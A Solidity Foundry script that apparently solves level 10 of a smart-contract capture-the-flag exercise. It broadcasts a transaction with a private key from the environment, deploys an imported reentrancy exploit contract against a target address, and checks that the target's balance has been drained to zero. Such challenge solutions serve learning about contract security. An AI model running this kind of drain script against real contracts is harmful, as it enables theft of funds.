pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {ReentranceExploit} from "../src/Level10Exploit.sol";

contract Level10Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        ReentranceExploit e = new ReentranceExploit(payable(_target));
        e.exploit{value: 0.001 ether}();
    }

    function levelDone(address _target) private view returns (bool) {
        return _target.balance == 0;
    }
}
